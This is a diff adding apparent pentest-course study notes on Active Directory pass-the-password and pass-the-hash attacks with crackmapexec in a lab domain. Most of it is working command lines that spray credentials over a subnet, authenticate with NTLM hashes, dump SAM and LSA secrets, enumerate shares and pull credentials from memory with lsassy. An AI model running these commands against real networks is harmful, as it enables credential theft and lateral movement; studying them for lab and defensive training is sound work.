@@ -28,3 +28,39 @@ lsassy does store credentials used in real time
 Difference d'utiliser --local-auth et -d ?
 
 ## Pass Attacks
+
+crackmapexec --help
+crackmapexec smb --help
+
+Lab command:
+crackmapexec smb 192.168.138.0/24 -u fcastle -d MARVEL.local -p Password1
+
+Knowing where we can access, we will later on start dumping secrets using secretsdump.py
+
+Lab command using hash (useful if hash cannot be cracked. NTLMv1 hash only. v2 can be relayed):
+crackmapexec smb 192.168.138.0/24 -u administrator -H HASH-V1 --local-auth
+
+Dump SAM base once a connection is validated:
+crackmapexec smb 192.168.138.0/24 -u administrator -H HASH-V1 --local-auth --sam
+SAM base is added to working database
+
+Enumerate the shares:
+crackmapexec smb 192.168.138.0/24 -u administrator -H HASH-V1 --local-auth --shares
+
+LSA for secret dump :
+crackmapexec smb 192.168.138.0/24 -u administrator -H HASH-V1 --local-auth --lsa
+Keep secrets but some passwords and so hashes might have been changed and are not valid anymore
+
+Modules:
+List modules
+crackmapexec smb -L
+
+Use module lsassy
+crackmapexec smb 192.168.138.0/24 -u administrator -H HASH-V1 --local-auth -M lsassy
+If any secret is stored in memory we may be able to see that
+
+Crackmapexec database:
+cmedb
+help
+host //all host pulled in the network
+creds // all the creds we found and on what they work
